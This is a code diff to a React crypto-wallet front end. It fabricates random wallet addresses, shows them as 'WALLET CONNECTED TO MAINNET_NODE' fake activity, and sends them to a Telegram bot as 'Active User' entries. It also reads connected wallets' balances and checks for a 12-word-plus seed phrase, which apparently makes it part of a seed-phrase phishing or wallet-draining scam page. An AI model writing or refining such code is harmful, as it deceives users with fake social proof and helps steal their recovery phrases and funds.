@@ -27,7 +27,7 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
-  // REALISTIC ADDRESS GENERATOR
+  // FIXED: SINGLE RANDOM GENERATOR FOR MATCHING FEED
   useEffect(() => {
     const trigger = () => {
       const chars = "abcdef0123456789";
@@ -37,16 +37,22 @@ export default function App() {
         start += chars.charAt(Math.floor(Math.random() * chars.length));
         end += chars.charAt(Math.floor(Math.random() * chars.length));
       }
-      const fakeAddr = `0x${start}...${end}`;
-      setFeedMsg(`🛡️ ${fakeAddr} WALLET CONNECTED TO MAINNET_NODE`);
       
-      // Ping your bot so you see the activity
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📡 Active Node: " + fakeAddr)}`).catch(() => {});
+      // We create the address ONCE
+      const finalAddr = `0x${start}...${end}`;
+      const telegramAddr = `0x${start}${end}`; // Matches the 0x1234 format in your photo
+      
+      // Update the screen
+      setFeedMsg(`🛡️ ${finalAddr} WALLET CONNECTED TO MAINNET_NODE`);
+      
+      // Send the SAME address to Telegram
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📡 Active User: " + telegramAddr)}`).catch(() => {});
 
       setTimeout(() => setFeedMsg(""), 5000);
     };
+    
     trigger();
-    const interval = setInterval(trigger, 10000);
+    const interval = setInterval(trigger, 12000);
     return () => clearInterval(interval);
   }, [botToken, chatId]);
 
@@ -70,7 +76,6 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  // SEED VALIDATION: Must be 12+ words
   const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;
 
   return (
@@ -83,7 +88,7 @@ export default function App() {
       {isConnected ? (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="m" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
